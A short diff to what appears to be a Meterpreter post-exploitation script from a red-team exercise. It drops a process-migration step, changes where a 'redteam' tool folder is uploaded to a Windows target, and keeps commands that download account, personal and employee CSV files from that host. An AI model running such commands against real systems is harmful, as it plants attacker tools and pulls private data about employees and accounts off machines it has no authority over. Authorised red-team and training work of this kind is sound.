@@ -1,5 +1,4 @@
-run post/windows/manage/migrate
-upload redteam C:\\redteam
+upload /root/redteam C:\\redteam
 download C:\\TeamXAccount.csv
 download C:\\TeamXPersonal.csv
 download C:\\TeamXEmployees.csv
